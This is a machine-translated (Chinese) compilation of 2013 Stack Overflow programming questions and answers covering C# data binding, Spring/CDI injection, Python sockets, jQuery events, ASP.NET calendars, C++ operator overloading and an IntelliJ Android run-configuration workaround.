    $.mobile.changePage('#Popup', {transition: 'pop', role: 'dialog'}); 
} 
```

# c# - 将文本框绑定到属性类

> ID：14832816
> 
> 赞同：2
> 
> 时间：2013-02-12T12:40:43.037
> 
> 标签：c#, .net, winforms, thread-safety

我有这些：

*   带有标签的表格
*   “商务”类
*   一个类“TimerHelper”

我想在更新属性时也`MyTime`更新文本框

我的“商务”课程如下所示：

```
public class MyBusinessClass : INotifyPropertyChanged
{
    public void MakeSound(object sender, ElapsedEventArgs e)
    {
        // I change MyTime here
    }   
    public event PropertyChangedEventHandler PropertyChanged;
    private int myTime;
    public int MyTime
    {
        get { return myTime; }
        set
        {
            myTime= value;
            InvokePropertyChanged(new PropertyChangedEventArgs("MyTime"));
        }
    }
    public void InvokePropertyChanged(PropertyChangedEventArgs e)
    {
        PropertyChangedEventHandler handler = PropertyChanged;
        if (handler != null) handler(this, e);
    }
} 
```

“TimerHelper”看起来像这样：

```
public class TimerHelper
{
    private Timer _timer;
    public void Run()
    {
        _timer = new Timer(1000);
        _timer.Enabled = true;
        _timer.Elapsed += new ElapsedEventHandler(MyBusinessClass.MakeSound);
    }
} 
```

在表格中，我尝试了这个：

```
myTextBox.DataBindings.Add("Text", new MyBusinessClass(), "MyTime"); 
```

但我在“InvokePropertyChanged”方法中遇到异常 ![在此处输入图像描述](../Images/65ce48a8a2ac4b1b12b7215306f05133.png)

我试过这个：

```
Invoke((MethodInvoker)delegate { myTextBox.Text = new MyBusinessClass().MyTime; }); 
```

但文本框永远不会更新

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T14:21:44.097

我在那里找到了答案： [A generic asynchronous asynchronous INotifyPropertyChanged helper](http://www.claassen.net/geek/blog/2007/07/generic-asynchronous.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T14:27:48.890

我认为您的问题是您正在尝试通过其他线程的数据引用来更新文本框。我的意思是，您正在使用 System.Timers.Timer 类，它在线程池中调用 Elapsed 事件。数据绑定无法更新控件，因为您正在更改该线程池中的业务类。您应该在 Elapsed 事件处理程序中更改线程上下文并在主线程（创建文本框的位置）中更新您的业务模型。

```
public class TimerHelper
{    
   private Timer _timer;
   public void Run()
   {
      _timer = new Timer(1000);
      _timer.Enabled = true;
      _timer.Elapsed += new ElapsedEventHandler(OnTimerElapsed);
   }
}

void OnTimerElapsed (object sender, ElapsedEventArgs e)
{
    if (myTextBox.InvokeRequired)
    {
        myTextBox.Invoke(MyBusinessClass.MakeSound);
    }
} 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:56:44.930

尽管我看不到您在哪里设置 的值`MyTime`（我假设它在`MakeSound`？），但您是`MyTime`在 UI 线程以外的线程上设置 的值。您可能正在使用`System.Timers.Timer`该类，它不会在 UI 线程上执行事件处理程序。如果要`System.Timers.Timer`在其委托中使用和更改 UI `ElapsedEventHandler`，则需要使用`SynchronizingObject`计时器上的属性。有关详细信息，请参阅此 MSDN 文章：[比较计时器类](http://msdn.microsoft.com/en-us/magazine/cc164015.aspx)

# spring - 在 glassfish 上的 CDI 管理 bean 中从其他罐子中注入 spring bean

> ID：14832819
> 
> 赞同：1
> 
> 时间：2013-02-12T12:40:57.270
> 
> 标签：spring, jsf

我有一个项目有多个模块，其中一个包含服务层、dao层和实体，项目结构如下：

![后端项目结构](../Images/00f96d51b59b4a56575d3f6a0921b43d.png)

这是我的 applicationContext.xml：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:tx="http://www.springframework.org/schema/tx"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
http://www.springframework.org/schema/tx
http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
http://www.springframework.org/schema/context
http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <context:annotation-config />
    <context:component-scan base-package="be.ahoy"/>

    <tx:annotation-driven transaction-manager="transactionManager"/>

    <bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">
        <property name="driverClassName" value="com.mysql.jdbc.Driver"/>
        <property name="url" value="jdbc:mysql://127.0.0.1:3306/ahoy"/>
        <property name="username" value="ahoy"/>
        <property name="password" value="ahoy"/>
        <property name="maxActive" value="100"/>
        <property name="maxIdle" value="30"/>
        <property name="maxWait" value="16000"/>
        <property name="minIdle" value="0"/>
    </bean>

    <bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <property name="persistenceUnitName" value="persistenceUnit"/>
        <property name="dataSource" ref="dataSource" />
    </bean>

    <bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
        <property name="entityManagerFactory" ref="entityManagerFactory"/>
    </bean>
</beans> 
```

这是我的 persistence.xml 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence
        xmlns="http://java.sun.com/xml/ns/persistence"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/persistence
    http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd"
        version="1.0">

    <persistence-unit name="persistenceUnit">
        <provider>org.hibernate.ejb.HibernatePersistence</provider>
        <properties>
            <property name="hibernate.hbm2ddl.auto" value="update"/>
            <property name="hibernate.show_sql" value="true"/>
            <property name="hibernate.dialect" value="org.hibernate.dialect.MySQLDialect"/>
        </properties>
    </persistence-unit>

</persistence> 
```

我正在使用 Spring 来处理依赖注入。我已经针对 DI 测试了应用程序的这一部分，并且它可以工作。

我现在希望将图中所示的服务注入到我的 WebApp 项目中的 CDI 托管 Bean 中。我该怎么做呢？我在后端模块上依赖于 WebApp 模块，因此它可以找到所有类，理想情况下我希望能够执行以下操作：

```
@Named
@Scope("session")
public class TestBean implements Serializable {

    @Inject
    private UserService userService;

    public String getName() {
        return userService.getById(20).getName();
    }
} 
```

我是否需要在 WebApp 项目中添加额外的 XML 配置文件才能使其工作？除了声明对它的依赖之外，我还需要对 BackEnd JAR 做些什么吗？

如果我尝试总是在 userService 上获得 NPE：

```
 [#|2013-02-12T14:07:51.990+0100|SEVERE|glassfish3.1.2|javax.enterprise.resource.webcontainer.jsf.application|_ThreadID=102;_ThreadName=Thread-2;|Error Rendering View[/lorenzo.xhtml]
javax.el.ELException: /lorenzo.xhtml: java.lang.NullPointerException
    at com.sun.faces.facelets.compiler.TextInstruction.write(TextInstruction.java:88)
    at com.sun.faces.facelets.compiler.UIInstructions.encodeBegin(UIInstructions.java:82)
    at com.sun.faces.facelets.compiler.UILeaf.encodeAll(UILeaf.java:183)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1760)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1760)
    at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:402)
    at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:131)
    at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:288)
    at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:121)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:139)
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:594)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1550)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:860)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:757)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1056)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:229)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.NullPointerException
    at TestBean.getName(TestBean.java:26)
    at org.jboss.weld.proxies.TestBean$Proxy$_$$_WeldClientProxy.getName(TestBean$Proxy$_$$_WeldClientProxy.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at javax.el.BeanELResolver.getValue(BeanELResolver.java:363)
    at com.sun.faces.el.DemuxCompositeELResolver._getValue(DemuxCompositeELResolver.java:176)
    at com.sun.faces.el.DemuxCompositeELResolver.getValue(DemuxCompositeELResolver.java:203)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:183)
    at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:224)
    at org.jboss.weld.el.WeldValueExpression.getValue(WeldValueExpression.java:50)
    at com.sun.faces.facelets.el.ELText$ELTextVariable.writeText(ELText.java:227)
    at com.sun.faces.facelets.el.ELText$ELTextComposite.writeText(ELText.java:150)
    at com.sun.faces.facelets.compiler.TextInstruction.write(TextInstruction.java:85)
    ... 35 more
|#]

[#|2013-02-12T14:07:51.992+0100|WARNING|glassfish3.1.2|javax.enterprise.system.container.web.com.sun.enterprise.web|_ThreadID=102;_ThreadName=Thread-2;|StandardWrapperValve[Faces Servlet]: PWC1406: Servlet.service() for servlet Faces Servlet threw exception
java.lang.NullPointerException
    at TestBean.getName(TestBean.java:26)
    at org.jboss.weld.proxies.TestBean$Proxy$_$$_WeldClientProxy.getName(TestBean$Proxy$_$$_WeldClientProxy.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at javax.el.BeanELResolver.getValue(BeanELResolver.java:363)
    at com.sun.faces.el.DemuxCompositeELResolver._getValue(DemuxCompositeELResolver.java:176)
    at com.sun.faces.el.DemuxCompositeELResolver.getValue(DemuxCompositeELResolver.java:203)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
    at com.sun.el.parser.AstValue.getValue(AstValue.java:183)
    at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:224)
    at org.jboss.weld.el.WeldValueExpression.getValue(WeldValueExpression.java:50)
    at com.sun.faces.facelets.el.ELText$ELTextVariable.writeText(ELText.java:227)
    at com.sun.faces.facelets.el.ELText$ELTextComposite.writeText(ELText.java:150)
    at com.sun.faces.facelets.compiler.TextInstruction.write(TextInstruction.java:85)
    at com.sun.faces.facelets.compiler.UIInstructions.encodeBegin(UIInstructions.java:82)
    at com.sun.faces.facelets.compiler.UILeaf.encodeAll(UILeaf.java:183)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1760)
    at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1760)
    at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:402)
    at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:131)
    at javax.faces.application.ViewHandlerWrapper.renderView(ViewHandlerWrapper.java:288)
    at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:121)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:139)
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:594)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1550)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:860)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:757)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1056)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:229)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722)
|#] 
```

# windows-7 - Windows 7 64bit 上的 Vagrant：无法匹配？在 /tmp/vagrant-puppet/manifests/default.pp:2 节点 lucid32.hsd1.ca.comcast.net

> ID：14832821
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:13.350
> 
> 标签：windows-7, lamp, host, vagrant

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T13:23:35.077

Some invalid quoting e.g. see line $vagrant_base_path = "/vagrant”</p>

All instances of ” have been corrected to "

# spring - 依赖注入为时已晚

> ID：14832824
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:26.057
> 
> 标签：spring, dependency-injection, javafx-2

我将 JavaFX 2 与 Spring Framework 结合使用，但是注入发生得很晚。我的控制器由 FXML-Loader 实例化，该控制器的成员变量的 Spring 注入有效，但它工作得太晚了，这意味着在 (1) 中注入尚未发生，而在 (2) 中注入确实发生了：

```
public class MainController extends AbstractController
{
    @Autowired
    public StatusBarController statusbarController;

    // Implementing Initializable Interface no longer required according to
    // http://docs.oracle.com/javafx/2/fxml_get_started/whats_new2.htm:
    private void initialize() {
        BorderPane borderPane = (BorderPane)getView();        
        borderPane.setBottom(statusbarController.getView()); // (1) null exception!
    }

    // Linked to a button in the view
    public void sayHello() {
        BorderPane borderPane = (BorderPane)getView();        
        borderPane.setBottom(statusbarController.getView()); // (2) works!
    }
} 
```

有什么方法可以让 Spring`statusbarController`在更早的状态下注入？我不能让用户必须单击按钮来加载我的 GUI ;-)

我的 AppFactory 是这样的：

```
@Configuration
public class AppFactory 
{
    @Bean
    public MainController mainController() throws IOException
    {
        return (MainController) loadController("/main.fxml");
    }

    protected Object loadController(String url) throws IOException
    {
        InputStream fxmlStream = null;
        try
        {
            fxmlStream = getClass().getResourceAsStream(url);
            FXMLLoader loader = new FXMLLoader();
            Node view = (Node) loader.load(fxmlStream);
            AbstractController controller = (AbstractController) loader.getController();
            controller.setView(view);
            return controller;            
        }
        finally
        {
            if (fxmlStream != null)
            {
                fxmlStream.close();
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T13:17:11.250

您应该在 FXMLLoader 上设置一个 ControllerFactory，以便您负责创建控制器实例。

# python - UDP 套接字 Python

> ID：14832825
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:30.117
> 
> 标签：python, sockets, udp

我有以下源代码：

```
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
s.bind(('', 9800))
try:
    while True:
        data, addr = s.recvfrom(256) #buffer size is 256 bytes
        print data, adrr
finally:
    s.close() 
```

当我执行它时，我收到以下错误：

```
回溯（最近一次通话最后）：
   文件“socket.py”，第 1 行，在
     导入套接字
   文件“C:\Users\Victor\Desktop\socket.py”，第 3 行，在
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
AttributeError：“模块”对象没有属性“AF_INET”

```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T12:44:07.220

更改脚本的名称。它正在尝试导入自己。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:45:11.800

您与 stdlib模块`socket.py`发生冲突。`socket`你应该重命名它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T12:45:33.007

您不能将 Python 源文件命名为与要导入的模块相同的名称。Python 解释器将导入您自己的源文件。

# jquery - jQuery：为什么 .change() 不触发事件

> ID：14832829
> 
> 赞同：1
> 
> 时间：2013-02-12T12:41:46.560
> 
> 标签：jquery

我将一些通过 ajax 读取的内容放在`div`. 内容具有某些脚本标签，用于绑定 ajax 内容中包含的某些元素上的某些事件。
**阿贾克斯内容：**

```
<div>
    <div>
        <select id='mySelectBox'>
            <option value="1">ONE</option>
            <option value="2" selected="selected">TWO</option>
        </select>
    </div>
    <script type="text/javascript">
         $(document).on("change",'#mySelectBox',function(){
            alert($('#mySelectBox').val());
         }); 
        $('#mySelectBox).change(); //problem here....
        </script>
</div> 
```

当我更改`'#mySelectBox'`. 但是这里在`$('#mySelectBox).change();`绑定后立即触发更改事件的语句中没有被调用。

可能是什么问题。？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-25T21:09:04.230

我相信您缺少结束语。试试这个：

```
$('#mySelectBox').change(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:44:54.437

`$('#mySelectBox).change();`不会触发事件。

`$('#mySelectBox).trigger('change');`做。:)

`.change()`实际上是一个包装器`.on('change');`

更新：

在委托事件的情况下， .trigger() 函数不会冒泡。可以在此处找到解决方法：

[如何使用 jQuery 手动触发委托事件？](https://stackoverflow.com/questions/12724147/how-do-i-manually-trigger-a-delegated-event-with-jquery)

# android - 如何使用 IntelijIdea 运行/调试配置绕过 android“am”中的数据 URL

> ID：14832830
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:48.707
> 
> 标签：android, intellij-idea

我想知道如何绕过 android 应用程序管理器 shell 命令选项，即 Intelij 运行/调试配置中的 -d？所以我将能够启动需要 URL 作为 Intent 中数据的 Activity。

类似于： `adb shell am start -d file:////storage/sdcard0/fileToOpen.txt -n some.package/some.Activity`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:41:48.707

到目前为止，我发现我可以在选择活动时作弊并输入：

```
some.package.Activity" -d "file:////storage/fileToOpen.txt 
```

这里的关键技巧是引号只是忽略错误消息，保存配置并运行应用程序。诀窍是 InteliJ Idea 将使用字符串而不进行任何验证，并将创建以下 shell 命令：

```
DEVICE SHELL COMMAND: am start -n "some.package.Activity" -d "file:////storage/fileToOpen.txt" 
```

我正在使用想法 - 社区 12.0.3

# selenium - Windows 7 机器上的 Selenium webdriver/grid

> ID：14832834
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:56.033
> 
> 标签：selenium, selenium-webdriver, selenium-grid

目前我可以使用 Selenium 节点执行 Windows XP 和 Vista 的 selenium 脚本：

```
java -Dwebdriver.chrome.driver="E:\selenium-hq\chromedriver.exe" -Dwebdriver.ie.driver="E:\selenium-hq\IEDriverServer_Win32_2.29.0\IEDriverServer.exe" -jar selenium-server-standalone-2.29.0.jar -role webdriver -hub http://localhost:4444/grid/register -maxSession 3 -browser browserName=chrome,maxInstances=3,platform=VISTA 
```

但是如何为 Windows 7 机器执行相同的脚本。

# c# - 如何在第二个日历中自动选择下一个日期

> ID：14832835
> 
> 赞同：0
> 
> 时间：2013-02-12T12:41:57.430
> 
> 标签：c#, asp.net

我的表格上有 6 个日历

*   DateFrom1 和 DateTo1
*   DateFrom2 和 DateTo2
*   DateFrom3 和 DateTo3

我的日历总是使用今天日期打开，但是，我不需要它。

我希望当我的用户`20/2/2013`从`DateFrom1`（日历）中选择时，然后当我的用户点击`DateTO1`（日历）时，它必须`21/2/2013`在打开的日历中自动选择。

如果他点击（日历），它应该在日历视图中`DateFrom2`显示为自动选择（ ）。`22/2/2013`

我怎样才能在 asp.net 中做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:46:58.187

在[Calander.SelectionChanged](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.calendar.selectionchanged%28v=vs.80%29.aspx)`.AddDays(1)`事件中，您可以使用 SelectedDate 指定另一个日历的[SelectedDate](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.calendar.selecteddate.aspx)到第二天。

```
void Selection_Change(Object sender, EventArgs e) 
{
  DateTo1.SelectedDate = DateFrom1.SelectedDate.AddDays(1);
} 
```

# c++ - 左值需要作为赋值的左操作数 - 数组

> ID：14832847
> 
> 赞同：1
> 
> 时间：2013-02-12T12:42:30.853
> 
> 标签：c++, arrays, operator-overloading

下面是错误所在的代码片段，该行

```
a[i][j] = m[i][j] + w[i][j]; 
```

返回错误

> 左值需要作为赋值的左操作数

我找不到适用于数组的答案，我的矩阵定义如下：

```
Matrix::Matrix() {
    for (int i = 0; i < 3; i++)
        for (int j = 0; j < 3; j++)
            coords[i][j] = 0.0f;
}

const Matrix operator+(const Matrix &m, const Matrix &w) {
    Matrix a;
    for (int i = 0; i < 3; i++)
        for (int j = 0; j < 4 ; j++)
            a[i][j] = m[i][j] + w[i][j];  // <----- error
    return a;
} 
```

这里是 operator[] 我如何通过引用返回

```
const Vector Matrix::operator[](int i) const{
    switch(i)
    {
    case 0: return Vector (coords[i][0], coords[i][1], coords[i][2]);
    case 1: return Vector (coords[i][0], coords[i][1], coords[i][2]);
    case 2: return Vector (coords[i][0], coords[i][1], coords[i][2]);
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-02-12T12:45:01.440

错误实际上是“需要**左值**作为赋值的左操作数”。

这意味着您`a[i][j]`正在给您一个临时对象。当您按值从函数返回时会发生这种情况。按值返回的函数调用是*右值*表达式，不能将右值表达式用作赋值的左操作数。您需要更改返回`operator[]`的 the`Matrix`和 helper 类的实现，`Matrix::operator[]`以便它们通过引用返回。通过引用返回的函数调用是一个左值表达式，并允许您分配给它。

```
template <typename T>
Vector<T>& Matrix<T>::operator[](int index) { ... }
template <typename T>
T& Vector<T>::operator[](int index) { ... } 
```

当然，这是有道理的。如果您`operator[]`的 s 没有通过引用返回，那么分配给它们返回的值对 s 的内容有何影响`Matrix`？

* * *

回应您的编辑：

你的班级设计有问题。该类`Matrix`似乎存储了一个`float`名为 s的 3×3 数组`coords`。但是，当您使用 时`Matrix::operator[]`，它将值从一行复制`coords`到一个`Vector`对象中。它们是*副本*。然后`Vector`按值返回它，这会将 和它包含的值复制`Vector`到函数之外。您对返回的任何操作`Vector`都只会影响该副本。

除此之外，你的`switch`说法完全没有意义。每个案例都完全相同。您只需要`i`用作数组索引而不是打开它。

另外，如果您要允许调用`operator[]`的人修改您的内容`Matrix`，则该`operator[]`函数不能是`const`.

有一些替代方案可以解决您的问题。第一个是只返回 a`float*`并取消您的计划`Vector`：

```
float* Matrix::operator[](int i) {
    return coords[i];
} 
```

这是一个非常简单的解决方案，但确实涉及传递一个原始指针。原始指针可以像数组一样使用，允许您使用`m[i][j]`.

您可以执行与 Eigen 库相同的操作，而是提供带有`operator()`两个参数的 a，即行索引和列索引：

```
float& Matrix::operator()(int i, int j) {
    return coords[i][j];
} 
```

请注意，`float`正在通过引用返回：`float&`. 这意味着可以从调用外部修改`operator()`. 在这里，您将使用`m(i, j)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:45:34.480

这意味着您的`[]`运算符返回一个没有地址的值，该地址不能用于赋值。它直截了当。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-12T13:25:05.587

是什么`Vector`？

问题可能从`Matrix::operator[]` 返回的内容开始。为了使`[][]`语法起作用，它*必须*返回某种代理，`[]`可以应用第二种代理，并且它将返回对矩阵中所需元素的引用。这样做的通常方法（至少对我而言）是在以下位置定义一个“setter”和“getter” `Matrix`：

```
void set( int i, int j, double new_value )
{
    myData[ getIndex( i, j ) ] = new_value;
}

double get( int i, int j ) const
{
    return myData[ getIndex( i, j ) ];
} 
```

然后使用两个代理（Matrix 中的嵌套类）：

```
class Proxy2D
{
    Matrix* myOwner;
    int myIndex1;
    int myIndex2;
public:
    Proxy2D( Matrix& owner, int index1, int index2 )
        : myOwner( &owner )
        , myIndex1( index1 )
        , myIndex2( index2 )
    {
    }
    void operator=( double new_value ) const
    {
        myOwner->set( myIndex1, myIndex2, new_value ):
    }
    operator double() const
    {
        return myOwner->get( myIndex1, myIndex2 );
    }
};

class Proxy1D
{
    Matrix* myOwner;
    int myIndex;
public:
    Proxy1D( Matrix& owner, int index )
        : myOwner( &owner )
        , myIndex( index )
    {
    }
    Proxy2D operator[]( int index2 ) const
    {
        return Proxy2D( *myOwner, myIndex, index2 );
    }
};

Proxy1D operator[]( int index1 )
{
    return Proxy1D( *this, index1 );
} 
```

在实践中，您还希望 const 变体由`operator[]( int index1 ) const`. 当然， `ConstProxy2D`不需要重载`operator=`; 隐式转换就足够了。

如果不明显，`Matrix::getIndex`请进行边界检查，然后计算 `std::vector<double>`包含数据的底层证券中的实际索引。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-12T13:19:15.513

由于您返回一个新构造的`Vector`对象来表示一列（或行，并不重要），这个 Vector 负责更新原始 Matrix 实例中的一个条目，这有点棘手但很容易解决：

您必须实现另一个`VectorRef`类，该类不按值表示向量，而是按引用表示，因此可用于以**lvalues**的形式访问组件。这意味着，它不包含作为值的数字，而是作为引用，并在其构造函数中获取这些引用。为简单起见，您可以使用指向第一个组件（后跟其他组件）的指针：

```
class VectorRef {
    float *coords;
public:
    VectorRef(float *coords) : coords(coords) {}
    float & operator[](int i) { return coords[i]; }
}; 
```

`operator[]`然后，在矩阵中构造这样一个“参考对象” ：

```
VectorRef Matrix::operator[](int i) {
    return VectorRef (coords[i]);
} 
```

要将`VectorRef`也用作 a `Vector`，请提供转换运算符：

```
 // (within VectorRef:)
    operator Vector() const { return Vector(coords[0], coords[1], coords[2]); } 
```

这应该使事情变得无懈可击。

或者，如果您总是访问矩阵中的元素而不是整个列，只需直接在`operator[]`矩阵中返回列指针：

```
float * Matrix::operator[](int i) {
    return coords[i];
} 
```

写入时`mat[x][y]`，这将首先访问浮点指针，`mat[x]`然后访问该`y`列的第 - 个元素，即**左值**。

# php - 从 data.php 获取结果，然后将其转换为 javascript 字符串

> ID：14832848
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:42:35.960
> 
> 标签：php, javascript, jquery

我真的不知道该怎么称呼这个。这是我的文件

data.php => 计算一些随机数 jscript.js => 这会将 data.php 的结果回显到一个 div id

但我想在某些方面做的是从 data.php 中获取值，然后将其放置到 div 的样式中。

```
 $.get('jQuery/data.php?Con&userHP&perc' , { userID: xUserID } ,
    function(output) {
        $('#userHP').html(output).show();
        var o = document.getElementById("userHealthbar");
        o.style.width= result_here ;
    }
); 
```

而不是将结果放在 div /div 中，我希望它到 div 的样式部分。

PS：我希望 data.php 的结果成为 javascript 中的变量。

但我似乎无法让它工作。我希望我的解释清楚。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:46:26.380

您应该使用 jQuery 选择器而不是 document.getelementById。

一般的方法：

```
jQuery('#userHealthbar').attr('style', whateverYouGotFromPHP); 
```

在这种情况下更好：

```
jQuery('#userHealthbar').width(whateverYouGotFromPHP); 
```

D.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T13:19:43.900

如果你想从 php 返回多个东西到 javascript，你应该使用 json。

因此，如果您有 2 个要在 php 中返回的值，您可以执行以下操作：

```
$html = "your html string";
$value = 4;    // the value you want to return

$array_to_return = array("html" => $html, "value" => $value);

